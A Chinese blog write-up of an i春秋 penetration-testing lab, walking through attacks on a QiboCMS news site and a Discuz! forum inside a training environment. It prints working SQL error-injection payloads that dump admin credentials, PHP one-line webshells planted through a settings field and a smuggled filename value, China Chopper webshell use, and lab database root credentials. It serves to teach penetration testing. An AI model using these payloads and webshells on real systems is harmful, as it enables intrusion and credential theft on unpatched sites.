---
title: 【i春秋】渗透测试入门 —— 渗透测试笔记
copyright: true
date: 2018-03-14 23:10:17
tags: [i春秋,pentest,exploit,writeup,CMS,crypto,web,php,database,sqli,trojan,vulnerability]
categories: [InfoSec,Pentest]
---

# 0x00 前言

本题算是一道较为综合的渗透题，要求对两个服务器系统进行渗透，第一个是**基于[齐博 CMS](http://www.php168.com/index.htm) 的信息资讯平台** `http://www.test.ichunqiu`，第二个是**基于 [Discuz!](http://www.discuz.net/forum.php) 的论坛社区** `http://bbs.test.ichunqiu`。这两个 CMS 同样能在网上找到许多漏洞，常用作渗透测试的练习靶机。

根据提示，第 1 题要求找到咨询平台的管理员账号密码；第 2 题需要登录服务器后台，并插入木马，再用[中国菜刀](http://www.zhongguocaidao.com/)连接，继而找到在管理员桌面上的 flag 文件；第 3 题要求在论坛社区的数据库中找到 admin 账户的 `salt` 值。

- 题目链接：[https://www.ichunqiu.com/battalion?t=2&r=54399](https://www.ichunqiu.com/battalion?t=2&r=54399)
- 解题链接：[https://www.ichunqiu.com/vm/50629/1](https://www.ichunqiu.com/vm/50629/1)

<!-- more -->

![guide](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/guide.png)

# 0x01 获取 www.test.ichunqiu 后台登录密码

利用 SQL 报错注入是获取管理员账号密码的常见方法。在浏览器搜索齐博 CMS 的可利用漏洞，其中发现了一个 SQL 报错注入漏洞，在 `/member/special.php` 中的 `$TB_pre` 变量未初始化，未作过滤，且直接与代码进行拼接，注入发生后可在报错信息中看到管理员的账号密码。详情可参考：

> [齐博CMS整站系统SQL注入](http://0day5.com/archives/3198/)

下面打开 Firefox 浏览器，根据漏洞说明先任意注册一个账号：

![register_info](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/register_info.png)

登录后点击 **会员中心 -> 专题管理 -> 创建专题**，任意创建一个专题：

![subject_creation](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/subject_creation.png)

点击专题名称，在弹出的专题页面中查看其 URL，并记录下 `id` 值（此处 `id=27`）：

![subject_id](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/subject_id.png)

接下来访问 `http://www.test.ichunqiu/member/special.php`，并打开 HackBar 工具，按照漏洞报告中的格式填写好 URL 和请求数据。URL 的查询字符串填入 `job=show_BBSiframe&id=27&type=all`（注意 `id` 值要等于上述专题 ID），请求数据填入 SQL 报错注入的 payload：

> 小贴士：为了方便使用 HackBar，可在浏览器右上角点击 **菜单 -> 定制**，将 HackBar 拖到工具栏中。

![sqli_1](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/sqli_1.png)

从报错信息中得知管理员账号为 `admin`，密码的哈希值只有 26 位，因此修改一下 payload 的输出值，再次注入，便可看到完整的密码哈希值为 `b10a9a82cf828627be682033e6c5878c`：

![sqli_2](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/sqli_2.png)

以上 payload 在漏洞报告的基础上稍作修改，否则输出不了完整的密码哈希。

关于 SQL 报错注入的可利用函数较多，本题选用了 [`extractvalue()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue) 函数：

```sql
TB_pre=qb_members where 1 and extractvalue(1,concat(0,(select concat(0x7e,username,password) from qb_members limit 1)))-- a
```

也可以选用 [`updatexml()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml) 函数：

```sql
TB_pre=qb_members where 1 and updatexml(1,concat(0,(select concat(0x7e,username,password) from qb_members limit 1)),0)-- a
```

以下是在[倾旋](http://payloads.online/)的公开课中总结出来的 [MySQL](https://www.mysql.com/) 数据库常用十大报错函数，建议去官方文档查阅每个函数的用法，多看多练，熟能生巧：

![error_function_1](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/error_function_1.png)

![error_function_2](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/error_function_2.png)

最后利用 [MD5解密工具](http://www.dmd5.com/md5-decrypter.jsp) 对密码哈希值解密，得到密码明文为 `whoami!@#123`：

![password](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/password.png)

# 0x02 获取目标服务器 1 管理员桌面的 FLAG 文件信息

获取了管理员权限，相当于完成了 getshell 的一半。随便搜搜可发现许多用于齐博 CMS getshell 的漏洞，下面选取两个文件写入漏洞进行复现。

## 后台频道页版权信息写入木马

第一个漏洞涉及两个操作：一是在网页底部版权信息中写入一句话木马，二是创建频道静态化页面。漏洞报告中未给出审计过程，本人对此组合拳甚是佩服，详情可参考：

> [齐博cms最新后台getshell](http://0day5.com/archives/1046/)

先搜索到齐博 CMS 的默认登录后台为 `/admin/index.php`，遂尝试访问，发现后台路径确实没修改。再用账号 `admin` 与密码 `whoami!@#123` 登录后台：

![login_back](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/login_back.png)

依次点击 **系统功能 -> 全局参数设置**，在 **网页底部版权信息** 中写入一句话木马 `<?php @assert($_POST['cmd']); ?>` 后保存设置：

![copyright](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/copyright.png)

这里为什么不用传统的一句话木马 `<?php @eval($_POST['cmd']); ?>` 呢？因为 CMS 对 `eval()` 函数进行了过滤，会将其转变成 `eva l()`：

![copyright_fail](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/copyright_fail.png)

所以此处能用 `assert()` 函数写入木马，也体现了 CMS 的写入过滤不完全。接着点击 **系统功能 -> 频道独立页管理 -> 添加频道页**，在 **频道页名字** 处填上任意字符（此处以 `sqli` 为例），在 **静态文件名** 处必须填上 `.php` 文件名，否则菜刀连接不上（此处以 `sqli.php` 为例）：

![channel](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/channel.png)

点击 **提交** 后，可在 **频道管理页** 中看到所添加的频道页，接下来一定要点击 **静态化** 按钮，才能正常访问 `http://www.test.ichunqiu/sqli.php`，否则只会弹出 404 页面：

![staticize](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/staticize.png)

在确认能够正常 `sqli.php` 页面后，准备 **添加SHELL** 进行菜刀连接：

![chopper_sqli](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_sqli.png)

成功连接后，在管理员桌面上看到了 flag 文件：

![flag_sqli](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/flag_sqli.png)

打开 flag 文件即可获得 `key{636bb37e}`，因此第 2 题答案就是 `636bb37e`：

![flag](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/flag.png)

## 前台栏目投稿自定义文件名写入木马

第二个漏洞是在前台栏目投稿设置信息中的 **自定义文件名** 输入框内触发，因此需要“自定义内容页文件名”的权限，不过我们已经有了管理员权限，故不必担心此问题。详情可参考：

> [齐博CMS某处任意文件写入getshell（需要一定权限）](https://www.secpulse.com/archives/30557.html)

首先用账号 `admin` 与密码 `whoami!@#123` 在前台登录，并点击 **！我要投稿**：

![login_front](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/login_front.png)

任选一栏目，在 **我要投稿** 处点击 **发表**（此处以**社会新闻**栏目为例）：

![contribute_select](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/contribute_select.png)

先在 **其他设置** 标签页下的 **自定义文件名** 输入框中写入木马 `x';@assert($_POST['cmd']);//y.htm`：

![contribute_setting](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/contribute_setting.png)

其中 `x';`是为了闭合代码中的左单引号，`//y.htm` 是为了使整体文件名有静态网页的后缀，并且注释掉后面的代码。注意此处不能用 `eval()` 函数构造木马，与前文一样会被过滤。

再回到 **基本信息** 标签页下，将带 `(*)` 的必填信息填好后提交：

![contribute_info](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/contribute_info.png)

提交后访问 `http://www.test.ichunqiu/data/showhtmltype.php`，成功看到报错信息：

![contribute_error](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/contribute_error.png)

接下来 **添加SHELL** 进行菜刀连接：

![chopper_showhtmltype](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_showhtmltype.png)

成功连接后，可在 `/data/showhtmltype.php` 源码中看到所添加的木马，印证了漏洞的存在：

![contribute_source](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/contribute_source.png)

查看管理员桌面上的 flag 文件与前文一致，此处不再赘述。

# 0x03 获取 bbs.test.ichunqiu 数据库中 admin 的 salt 值

第 3 题终于引入了 `http://bbs.test.ichunqiu` 论坛社区...的数据库了。出题人好像为了方便我们直接进行本题，特意在主站根目录下放了木马 `/2.php`，免去了上题插入木马的过程：

![trojan](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/trojan.png)

所以下次想直接复现第 3 题，用菜刀连上此木马即可：

![chopper_trojan](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_trojan.png)

我们在根目录下可看到 `/dedecms_bak` 的文件夹，进一步搜索到 DEDECMS 的[默认数据库配置文件](https://zhidao.baidu.com/question/1882828001505455828.html)为 `/data/common.inc.php`，打开一看，果不其然：

![dedecms_config](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/dedecms_config.png)

但是主机地址显示为 `172.16.12.3`，跟 `http://bbs.test.ichunqiu` 好像没什么关系吧？其实不然，打开主机终端，用 `nslookup` 命令可得到论坛的 IP 地址就是 `172.16.12.3`，顺便可看到主站的 IP 地址为  `172.16.12.2`：

![nslookup](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/nslookup.png)

注意到数据库配置信息中是根用户权限，因此若能连上 DEDECMS 在 `172.16.12.3` 上的数据库，那么 Discuz! 在 `172.16.12.3` 上的数据库也能被访问到！于是，在菜刀 **添加SHELL** 的配置中填入数据库信息**（THUPL）**：

> 小贴士：如何在菜刀中填入数据库配置信息请参考 [黑站利器-中国菜刀的功能介绍和使用方法](http://www.daixiaorui.com/read/17.html)

```config
<T>mysql</T>
<H>172.16.12.3</H>
<U>root</U>
<P>opiznmzs&**(</P>
<L>gbk</L>
```

![chopper_bbs](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_bbs.png)

保存设置后右键条目，选择 **数据库管理**，成功连接后可见服务器端的数据库管理界面：

![chopper_db](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_db.png)

又经过一番搜索，得知 `ultrax` 正是 Discuz! 的数据库，而 `dedecms` 显而易见是 DEDECMS 的。我们的目标应该是 `ultrax` 数据库中某个表的 `salt` 字段，这里必须要介绍一下 MySQL 自带的 `information_schema` 数据库，它提供了对元数据的访问方式，是 MySQL 中的百科全书，其中在 `information_schema.COLUMNS` 表中记录了本数据库所有字段的相关信息。详情可参考：

> [MySQL中information_schema是什么](http://blog.csdn.net/u014639561/article/details/51579161)

因此，只要输入一条简单的 SQL 语句，点击 **执行**，有关 `salt` 字段的所有信息将会呈现：

```sql
SELECT * FROM COLUMNS WHERE COLUMN_NAME = 'salt'
```

![chopper_search](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_search.png)

最终我们在 `ultrax` 数据库的 `pre_ucenter_members` 表中发现了 `salt` 字段的值为 `9b47b6`：

![chopper_salt](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_salt.png)

到此为止，本次渗透测试的指定任务已达成。

意犹未尽的各位看官可接着往下看，既然我们把 `172.16.12.3` 上的数据库给爆了，那也趁此机会，不妨把 `172.16.12.2` 上的数据库也给爆了。经过搜索后发现，齐博 CMS 的[默认数据库配置文件](https://zhidao.baidu.com/question/252236807.html)为 `/data/mysql_config.php `：

![qibo_config](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/qibo_config.png)

然后在菜刀 **添加SHELL** 的配置中修改数据库信息：

![chopper_www](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_www.png)

成功连接后，在 `qibov7` 数据库的 `qb_members` 表中发现第 1 题中管理员的账号与密码哈希值：

![chopper_qibo](http://oyhh4m1mt.bkt.clouddn.com/i%E6%98%A5%E7%A7%8B_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/chopper_qibo.png)

至此，本题两个服务器中的数据库系统已被我们打穿。还想继续深挖的朋友，建议去尝试获得论坛社区的 webshell，并通过提权获得两个服务器系统的最高权限，达到完全控制的最终目的。

# 0x04 小结

本题虽然有两台目标服务器，但万变不离其宗，熟练之后自然得心应手。在此过程中，我同样也受益匪浅，细心的读者会发现全文多次出现**『搜索』**二字，而渗透测试的核心正是**收集目标系统的信息，挖掘其漏洞并加以利用**。

> 小贴士：关于本系列渗透的练习方法，建议先自己动手做，用尽你毕生所学，实在卡住无法继续时（比如规定在半小时内），再翻看 writeup，把当前的困难点看懂后就不要往下看了。接着按上述流程一直往下做，直至完成渗透目标。

以上是笔者之拙见，不足之处还望各位指出，有其他更猥琐的渗透的思路欢迎前来交流。最后向以下参考 writeup 的作者表示致谢！

> [11-在线挑战详细攻略-《渗透测试笔记》](https://bbs.ichunqiu.com/thread-29259-1-1.html)